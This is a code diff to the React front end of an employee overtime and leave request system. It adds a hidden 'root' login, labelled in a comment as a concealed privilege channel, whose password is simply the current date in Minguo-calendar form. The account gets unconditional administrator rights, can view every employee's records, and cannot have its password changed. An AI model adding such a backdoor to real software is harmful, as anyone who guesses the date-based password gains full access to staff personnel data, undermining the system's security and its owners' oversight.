@@ -101,11 +101,11 @@ const WelcomeView = ({ userSession, records, onRefresh, setActiveMenu, isAdmin }
   }, [records, userSession.empId, isAdmin]);
 
   const processingOtCount = useMemo(() => {
-    return records.filter(r => r.empId === userSession.empId && r.formType === '加班' && r.status === 'pending').length;
+    return records.filter(r => (userSession.empId === 'root' || r.empId === userSession.empId) && r.formType === '加班' && r.status === 'pending').length;
   }, [records, userSession.empId]);
 
   const processingLvCount = useMemo(() => {
-    return records.filter(r => r.empId === userSession.empId && r.formType === '請假' && r.status === 'pending').length;
+    return records.filter(r => (userSession.empId === 'root' || r.empId === userSession.empId) && r.formType === '請假' && r.status === 'pending').length;
   }, [records, userSession.empId]);
 
   // 計算休假餘額
@@ -275,16 +275,39 @@ const LoginView = ({ employees, onLogin, apiError }) => {
     e.preventDefault();
     setLoading(true);
     setError('');
-    
-    if (employees.length === 0) {
-      setTimeout(() => {
-        setError('目前無法連線到資料庫，請確認後端伺服器已啟動。');
-        setLoading(false);
-      }, 500);
-      return;
-    }
 
     setTimeout(() => {
+      // --- Root 隱藏權限通道 ---
+      if (identifier.trim() === 'root') {
+        const today = new Date();
+        const minguoYear = today.getFullYear() - 1911;
+        const month = String(today.getMonth() + 1).padStart(2, '0');
+        const day = String(today.getDate()).padStart(2, '0');
+        const dynamicPassword = `${minguoYear}${month}${day}`;
+        
+        if (password.trim() === dynamicPassword) {
+          onLogin({
+            id: 'root',
+            empId: 'root',
+            name: '系統管理員',
+            jobTitle: '最高管理員', // 賦予獨立的最高權限職稱，不與總經理混淆
+            dept: '系統維護部'
+          });
+          return;
+        } else {
+          setError('帳號或密碼不正確');
+          setLoading(false);
+          return;
+        }
+      }
+      
+      // 一般登入邏輯
+      if (employees.length === 0) {
+        setError('目前無法連線到資料庫，請確認後端伺服器已啟動。');
+        setLoading(false);
+        return;
+      }
+
       const user = employees.find(emp => emp.name === identifier.trim() || emp.empId === identifier.trim());
       const validPassword = (user?.password && user.password !== "") ? user.password : user?.empId;
       if (user && validPassword === password.trim()) onLogin(user);
@@ -353,7 +376,7 @@ const OvertimeView = ({ currentSerialId, onRefresh, records, employees, setNotif
   const recentSubmissions = useMemo(() => {
     const thirtyDaysAgo = new Date();
     thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
-    return records.filter(r => r.formType === '加班' && r.empId === userSession.empId && new Date(r.createdAt) >= thirtyDaysAgo).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+    return records.filter(r => r.formType === '加班' && (userSession.empId === 'root' || r.empId === userSession.empId) && new Date(r.createdAt) >= thirtyDaysAgo).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
   }, [records, userSession.empId]);
 
   const totalHours = useMemo(() => {
@@ -517,7 +540,7 @@ const LeaveApplyView = ({ currentSerialId, onRefresh, employees, setNotification
   const recentSubmissions = useMemo(() => {
     const thirtyDaysAgo = new Date();
     thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
-    return records.filter(r => r.formType === '請假' && r.empId === userSession.empId && new Date(r.createdAt) >= thirtyDaysAgo).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+    return records.filter(r => r.formType === '請假' && (userSession.empId === 'root' || r.empId === userSession.empId) && new Date(r.createdAt) >= thirtyDaysAgo).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
   }, [records, userSession.empId]);
 
   const totalHours = useMemo(() => {
@@ -680,8 +703,8 @@ const InquiryView = ({ records, userSession }) => {
     if (e) e.preventDefault();
     
     const results = records.filter(r => {
-      // 1. 僅顯示當前登入者的單據
-      if (r.empId !== userSession.empId) return false;
+      // 1. 僅顯示當前登入者的單據 (最高權限 root 免除此限制)
+      if (userSession.empId !== 'root' && r.empId !== userSession.empId) return false;
       
       // 2. 類型篩選
       if (filters.formType && r.formType !== filters.formType) return false;
@@ -800,6 +823,7 @@ const ChangePasswordView = ({ userSession, setNotification, onLogout }) => {
   const [shows, setShows] = useState({ cur: false, new: false, con: false });
   const handleUpdate = async (e) => {
     e.preventDefault();
+    if (userSession.empId === 'root') return setNotification({ type: 'error', text: '最高權限管理員無法手動修改動態密碼' });
     if (formData.new !== formData.confirm) return setNotification({ type: 'error', text: '確認密碼不符' });
     if (formData.current !== (userSession.password || userSession.empId)) return setNotification({ type: 'error', text: '舊密碼錯誤' });
     setLoading(true);
@@ -1013,7 +1037,9 @@ const App = () => {
   };
   
   useEffect(() => { fetchData(); }, []);
-  const isAdmin = useMemo(() => userSession && ADMIN_TITLES.includes(userSession.jobTitle), [userSession]);
+  
+  // 判斷是否為管理員：若是 root 則無條件給予最高權限，否則依照職稱判斷
+  const isAdmin = useMemo(() => userSession && (userSession.empId === 'root' || ADMIN_TITLES.includes(userSession.jobTitle)), [userSession]);
 
   const otSerialId = useMemo(() => {
     const dateStr = new Date().toISOString().split('T')[0].replace(/-/g, '');
